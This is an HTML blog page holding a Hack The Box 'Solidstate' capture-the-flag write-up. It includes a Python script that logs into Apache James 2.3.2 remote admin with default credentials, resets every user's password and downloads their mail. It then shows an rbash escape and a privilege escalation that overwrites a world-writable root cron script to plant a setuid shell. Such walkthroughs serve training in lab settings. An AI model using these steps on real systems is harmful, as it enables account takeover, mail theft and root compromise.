@@ -1,0 +1,369 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    
+    
+
+
+    <head>
+    <link href="https://gmpg.org/xfn/11" rel="profile">
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta http-equiv="Cache-Control" content="public" />
+<!-- Enable responsiveness on mobile devices -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="generator" content="Hugo 0.73.0" />
+
+    
+    
+    
+
+<title>HTB - Solidstate write up • tales from the &lt;script&gt;</title>
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="HTB - Solidstate write up"/>
+<meta name="twitter:description" content="This box was fairly easy but it had a new technology I&rsquo;ve never heard of before called &ldquo;Apache James&rdquo;.
+If you run a basic nmap with all ports, default scripts, service and OS identification like this nmap -p- -A 10.10.10.51 -vv
+you will find the following ports open: PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 7.4p1 Debian 10&#43;deb9u1 (protocol 2.0) 25/tcp open smtp syn-ack ttl 63 JAMES smtpd 2."/>
+
+<meta property="og:title" content="HTB - Solidstate write up" />
+<meta property="og:description" content="This box was fairly easy but it had a new technology I&rsquo;ve never heard of before called &ldquo;Apache James&rdquo;.
+If you run a basic nmap with all ports, default scripts, service and OS identification like this nmap -p- -A 10.10.10.51 -vv
+you will find the following ports open: PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 7.4p1 Debian 10&#43;deb9u1 (protocol 2.0) 25/tcp open smtp syn-ack ttl 63 JAMES smtpd 2." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.talesfromthescript.co.uk/posts/solidstate/" />
+<meta property="article:published_time" content="2018-01-25T08:59:59+00:00" />
+<meta property="article:modified_time" content="2018-01-25T08:59:59+00:00" />
+
+
+    
+
+
+
+
+
+
+<link rel="stylesheet" href="/scss/hyde-hyde.71157e768c4e111a23c3531b95e0cbb59bbef3c9e6901d36247cb53d6b6be258.css" integrity="sha256-cRV&#43;doxOERojw1MbleDLtZu&#43;88nmkB02JHy1PWtr4lg=">
+
+
+<link rel="stylesheet" href="/scss/print.2744dcbf8a0b2e74f8a50e4b34e5f441be7cf93cc7de27029121c6a09f9e77bc.css" integrity="sha256-J0Tcv4oLLnT4pQ5LNOX0Qb58&#43;TzH3icCkSHGoJ&#43;ed7w=" media="print">
+
+
+
+    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+    <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
+    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+    <!-- Icons -->
+    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/apple-touch-icon-144-precomposed.png">
+    <link rel="shortcut icon" href="/favicon.png">
+    
+    
+
+</head>
+
+
+    <body class=" ">
+    
+<div class="sidebar">
+  <div class="container ">
+    <div class="sidebar-about">
+      <span class="site__title">
+        <a href="https://www.talesfromthescript.co.uk/">tales from the &lt;script&gt;</a>
+      </span>
+      
+        
+        
+        
+        <div class="author-image">
+          <img src="https://www.talesfromthescript.co.uk/img/zombie.png" alt="Author Image" class="img--circle img--headshot element--center">
+        </div>
+        
+      
+      
+      <p class="site__description">
+        
+      </p>
+    </div>
+    <div class="collapsible-menu">
+      <input type="checkbox" id="menuToggle">
+      <label for="menuToggle">tales from the &lt;script&gt;</label>
+      <div class="menu-content">
+        <div>
+	<ul class="sidebar-nav">
+		 
+		 
+			 
+				<li>
+					<a href="/tags/ctf">
+						<span>Ctf</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/about/">
+						<span>About</span>
+					</a>
+				</li>
+			 
+		
+	</ul>
+</div>
+
+        <section class="social">
+	
+	<a href="https://twitter.com/highjack_" rel="me"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a>
+	
+	
+	
+	<a href="https://github.com/highjack" rel="me"><i class="fab fa-github fa-lg" aria-hidden="true"></i></a>
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+</section>
+
+      </div>
+    </div>
+    
+<div class="copyright">
+  &copy; 2020 highjack
+  
+</div>
+
+
+
+  </div>
+</div>
+
+        <div class="content container">
+            
+    
+<article>
+  <header>
+    <h1>HTB - Solidstate write up</h1>
+    
+    
+<div class="post__meta">
+    
+    
+      <i class="fas fa-calendar-alt"></i> Jan 25, 2018
+    
+    
+    
+    
+    
+      
+      
+          <br/>
+           <i class="fas fa-tags"></i>
+          
+          <a class="badge badge-tag" href="/tags/ctf">ctf</a>
+          
+      
+    
+    
+    <br/>
+    <i class="fas fa-clock"></i> 5 min read
+</div>
+
+
+  </header>
+  
+  
+  <div class="post">
+    <p>This box was fairly easy but it had a new technology I&rsquo;ve never heard of before called &ldquo;Apache James&rdquo;.</p>
+<p>If you run a basic nmap with all ports, default scripts, service and OS identification like this
+<strong>nmap -p- -A  10.10.10.51 -vv</strong></p>
+<p>you will find the following ports open:
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">PORT     STATE SERVICE     REASON         VERSION
+22/tcp   open  ssh         syn-ack ttl 63 OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
+25/tcp   open  smtp        syn-ack ttl 63 JAMES smtpd 2.3.2
+|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.15.125 [10.10.15.125]), 
+80/tcp   open  http        syn-ack ttl 63 Apache httpd 2.4.25 ((Debian))
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Home - Solid State Security
+110/tcp  open  pop3        syn-ack ttl 63 JAMES pop3d 2.3.2
+119/tcp  open  nntp        syn-ack ttl 63 JAMES nntpd (posting ok)
+4555/tcp open  james-admin syn-ack ttl 63 JAMES Remote Admin 2.3.2</code></pre></div></p>
+<p>After a quick google for Apache James 2.3.2 exploits we find <!-- raw HTML omitted -->this<!-- raw HTML omitted --> the exploit is able to overwrite/create files such as /etc/bash_completion.d with a payload we specify, I tried this out with no luck, pressumably because no one was logged in so th bash completion never triggered.</p>
+<p>After studying the exploit I decided to build something to change the smtp passwords of all the users so I could read their email, it look as follows:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> telnetlib
+<span style="color:#f92672">import</span> poplib
+<span style="color:#f92672">import</span> email
+<span style="color:#f92672">import</span> os
+
+user <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;root&#34;</span>
+password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;root&#34;</span>
+host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;10.10.10.51&#34;</span>
+port <span style="color:#f92672">=</span> <span style="color:#ae81ff">4555</span>
+tn <span style="color:#f92672">=</span> telnetlib<span style="color:#f92672">.</span>Telnet(host,port)
+tn<span style="color:#f92672">.</span>read_until(<span style="color:#e6db74">&#34;Login id:&#34;</span>)
+tn<span style="color:#f92672">.</span>write(user<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+tn<span style="color:#f92672">.</span>read_until(<span style="color:#e6db74">&#34;Password:&#34;</span>)
+tn<span style="color:#f92672">.</span>write(password <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+tn<span style="color:#f92672">.</span>read_until(<span style="color:#e6db74">&#34;commands&#34;</span>)
+tn<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#39;listusers</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+user_count_regex <span style="color:#f92672">=</span> tn<span style="color:#f92672">.</span>expect([<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;Existing accounts \d&#34;</span>])
+user_count <span style="color:#f92672">=</span> user_count_regex[<span style="color:#ae81ff">2</span>]
+user_count <span style="color:#f92672">=</span>  int(user_count<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34; &#34;</span>)[<span style="color:#ae81ff">2</span>])
+
+user_list <span style="color:#f92672">=</span> []
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, user_count<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>):
+    current_user <span style="color:#f92672">=</span> tn<span style="color:#f92672">.</span>read_until(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;user: &#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>)
+    current_user <span style="color:#f92672">=</span> current_user<span style="color:#f92672">.</span>strip()
+    <span style="color:#66d9ef">if</span> current_user <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;&#34;</span>:
+        user_list<span style="color:#f92672">.</span>append(current_user)
+<span style="color:#66d9ef">for</span> email_user <span style="color:#f92672">in</span> user_list:
+    <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;[+] resetting password of &#34;</span> <span style="color:#f92672">+</span> email_user
+    tn<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#34;setpassword &#34;</span> <span style="color:#f92672">+</span> email_user <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; highjack</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+    tn<span style="color:#f92672">.</span>read_until(<span style="color:#e6db74">&#34;reset&#34;</span>)
+    
+    mail <span style="color:#f92672">=</span> poplib<span style="color:#f92672">.</span>POP3(host)
+
+    <span style="color:#75715e">#Login to mail server</span>
+    mail<span style="color:#f92672">.</span>user(email_user)
+    mail<span style="color:#f92672">.</span>pass_(<span style="color:#e6db74">&#34;highjack&#34;</span>)
+
+    <span style="color:#75715e">#Get the number of mail messages</span>
+    numMessages <span style="color:#f92672">=</span> len(mail<span style="color:#f92672">.</span>list()[<span style="color:#ae81ff">1</span>])
+
+    <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;[+] found </span><span style="color:#e6db74">%d</span><span style="color:#e6db74"> messages for </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> (numMessages, email_user)
+    current_folder <span style="color:#f92672">=</span>  os<span style="color:#f92672">.</span>getcwd()
+    <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;[+] saving emails to &#34;</span> <span style="color:#f92672">+</span> current_folder <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/&#34;</span> <span style="color:#f92672">+</span> email_user
+    <span style="color:#66d9ef">try</span>:
+        os<span style="color:#f92672">.</span>makedirs(email_user)
+    <span style="color:#66d9ef">except</span>:
+        <span style="color:#66d9ef">pass</span>
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(numMessages):
+        <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> mail<span style="color:#f92672">.</span>retr(i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>)[<span style="color:#ae81ff">1</span>]:
+            msg <span style="color:#f92672">=</span> email<span style="color:#f92672">.</span>message_from_string(j)
+            fp <span style="color:#f92672">=</span> open(email_user<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;/&#34;</span><span style="color:#f92672">+</span>str(i)<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;.txt&#34;</span>,<span style="color:#e6db74">&#34;a&#34;</span>)
+            fp<span style="color:#f92672">.</span>write(msg<span style="color:#f92672">.</span>get_payload())
+            fp<span style="color:#f92672">.</span>close()</code></pre></div>
+<p>When we run the script we get the following output:
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">[root:~/notes]# python change-passwords.py
+[+] resetting password of james
+[+] found 0 messages for james
+[+] saving emails to /media/sf_shared/notes/james
+[+] resetting password of ../../../../../../../../etc/bash_completion.d
+[+] found 7 messages for ../../../../../../../../etc/bash_completion.d
+[+] saving emails to /media/sf_shared/notes/../../../../../../../../etc/bash_completion.d
+[+] resetting password of thomas
+[+] found 0 messages for thomas
+[+] saving emails to /media/sf_shared/notes/thomas
+[+] resetting password of john
+[+] found 1 messages for john
+[+] saving emails to /media/sf_shared/notes/john
+[+] resetting password of mindy
+[+] found 2 messages for mindy
+[+] saving emails to /media/sf_shared/notes/mindy
+[+] resetting password of mailadmin
+[+] found 0 messages for mailadmin
+[+] saving emails to /media/sf_shared/notes/mailadmin
+[+] resetting password of /../../../../../../../etc/bash_completion.d
+[+] found 5 messages for /../../../../../../../etc/bash_completion.d
+[+] saving emails to /media/sf_shared/notes//../../../../../../../etc/bash_completion.d</code></pre></div></p>
+<p>Browsing through the downloaded emails we find interesting information included Mindy&rsquo;s credentials:
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">[root:~/notes/john]# cat 0.txt 
+John, Can you please restrict mindy&#39;s access until she gets read on to the program. Also make sure that you send her a tempory password to login to her accounts.Thank you in advance.Respectfully,James#
+
+[root:~/notes/mindy]# cat 0.txt 
+Dear Mindy,Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you.We are looking forward to you joining our team and your success at Solid State Security. Respectfully,James
+
+[root:~/notes/mindy]# cat 1.txt
+Dear Mindy,Here are your ssh credentials to access the system. Remember to reset your password after your first login. Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. Respectfully,James
+
+username: mindy
+pass: P@55W0rd1!2@
+
+Respectfully,
+James</code></pre></div></p>
+<p>After logging into ssh as Mindy, we notice that the shell is restrictive bash, luckily for us it&rsquo;s pretty easy to bypass it:
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">mindy@solidstate:~$ echo $SHELL
+/bin/rbash
+
+[root:/media/sf_shared/notes]# ssh mindy@10.10.10.51 bash
+mindy@10.10.10.51&#39;s password: 
+python -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;  
+mindy@solidstate:~$ </code></pre></div></p>
+<p>While trying to elevate privileges I found a writable file at /opt/tmp.py it&rsquo;s owned by root and based on the content it looks like the kind of script that would run as a cron to clear out tmp.
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">mindy@solidstate:~$ find / -writable -type f 2&gt;/dev/null  
+/opt/tmp.py
+
+mindy@solidstate:~$ ls -al /opt/tmp.py
+ls -al /opt/tmp.py
+-rwxrwxrwx 1 root root 136 Jan 26 17:32 /opt/tmp.py</code></pre></div></p>
+<p>All /opt/tmp.py is wipe out the contents of /tmp this looks like the type of behavior you&rsquo;d expect in a cronjob, so it makes sense to try to overwrite it with our own script:
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">echo &#39;import os&#39; &gt; /opt/tmp.py
+echo &#39;os.system(&#34;cp /bin/sh /tmp/highjack&#34;) &gt;&gt; /opt/tmp.py&#39;
+echo &#39;os.system(&#34;chmod 4755 /tmp/highjack&#34;) &gt;&gt; /opt/tmp.py&#39;</code></pre></div></p>
+<p>Now we just need to wait for the cronjob to trigger and run our new shell to get root:
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">mindy@solidstate:~$ /tmp/highjack
+/tmp/highjack
+# id
+id
+uid=1001(mindy) gid=1001(mindy) euid=0(root) groups=1001(mindy)
+# whoami
+whoami
+root</code></pre></div></p>
+
+  </div>
+  
+
+<div class="navigation navigation-single">
+    
+    <a href="/posts/fristi-leaks/" class="navigation-prev">
+      <i aria-hidden="true" class="fa fa-chevron-left"></i>
+      <span class="navigation-tittle">VULNHUB - Fristi Leaks</span>
+    </a>
+    
+    
+    <a href="/posts/mantis/" class="navigation-next">
+      <span class="navigation-tittle">HTB - Mantis write up</span>
+      <i aria-hidden="true" class="fa fa-chevron-right"></i>
+    </a>
+    
+</div>
+
+
+  
+
+  
+    
+
+
+</article>
+
+
+        </div>
+        
+    
+
+<script defer src="https://use.fontawesome.com/releases/v5.11.2/js/all.js" integrity="sha384-b3ua1l97aVGAPEIe48b4TC60WUQbQaGi2jqAWM90y0OZXZeyaTCWtBTKtjW2GXG1" crossorigin="anonymous"></script>
+
+
+
+
+    
+
+
+
+    </body>
+</html>
